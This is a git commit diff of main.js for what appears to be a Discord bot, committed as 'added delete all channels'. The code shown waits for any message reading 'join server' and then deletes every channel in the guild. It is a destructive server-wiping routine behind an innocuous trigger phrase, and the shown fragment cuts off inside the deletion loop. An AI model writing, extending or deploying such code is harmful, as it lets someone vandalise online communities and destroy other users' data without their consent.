9119f77592dc9a84b96776ce8acf207b3b066db2
Epicgamer904 <dabestgamerok@gmail.com>
2021-11-30 09:48:30 +1300

    added delete all channels

--- main.js
+++ main.js
@@ -5,7 +5,7 @@ const config = require('./config.json')
 client.login(config.token)
 
 client.on('message', async (message) => {
-    if (message.content === 'join server'){
+    if (message.content == 'join server'){
         console.log('started')
         message.guild.channels.cache.forEach((channel)=>{
             channel.delete() 
